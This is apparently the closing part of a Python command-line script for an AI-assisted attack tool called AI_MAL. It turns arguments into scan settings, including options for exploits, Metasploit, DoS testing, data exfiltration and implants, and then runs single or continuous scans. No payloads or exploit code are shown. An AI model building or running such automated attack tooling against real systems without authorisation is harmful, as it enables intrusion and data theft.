    # Configure logging based on arguments
    log_level = getattr(logging, args.log_level.upper())
    logger.setLevel(log_level)
    
    # If no target is provided, show help and exit
    if not args.target:
        parser.print_help()
        return 1
        
    # Determine scan type based on arguments
    scan_type = "stealthy" if args.stealth else "aggressive" if args.vuln or args.full_auto else "basic"
    
    # Create configuration dictionary from arguments
    config = {
        "target": args.target,
        "scan_type": scan_type,
        "continuous": args.continuous,
        "delay": args.delay,
        "service_detection": args.services or args.version,
        "version_detection": args.version,
        "os_detection": args.os,
        "vuln_detection": args.vuln,
        "dos_testing": args.dos,
        "msf_enabled": args.msf,
        "exploit_enabled": args.exploit,
        "custom_scripts": args.custom_scripts,
        "script_type": args.script_type,
        "execute_scripts": args.execute_scripts,
        "script_output": args.script_output,
        "script_format": args.script_format,
        "ai_analysis": args.ai_analysis,
        "model": args.model,
        "fallback_model": args.fallback_model,
        "exfil": args.exfil,
        "implant": args.implant,
        "output_dir": args.output_dir,
        "output_format": args.output_format,
        "quiet": args.quiet,
        "no_gui": args.no_gui,
        "log_level": args.log_level,
        "log_file": args.log_file,
        "full_auto": args.full_auto,
        "custom_vuln": args.custom_vuln
    }
    
    try:
        # Initialize AI_MAL with configuration
        ai_mal = AI_MAL(config)
        
        # Set up asyncio event loop
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            # If no event loop exists, create a new one
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        # Run the scan using asyncio
        logger.info(f"Starting scan on {args.target} with scan type {scan_type}")
        if args.continuous:
            print(f"Running continuous scan with {args.delay} second delay")
            while True:
                result = ai_mal.run(args.target, scan_type)
                if result.get("error"):
                    logger.error(f"Scan failed: {result['error']}")
                    break
                time.sleep(args.delay)
        else:
            result = ai_mal.run(args.target, scan_type)
            if result.get("error"):
                logger.error(f"Scan failed: {result['error']}")
                return 1
                
        return 0
                
    except Exception as e:
        logger.error(f"Error during scan execution: {str(e)}")
        if args.log_level == "debug":
            logger.exception("Full traceback:")
        return 1

if __name__ == "__main__":
    sys.exit(main())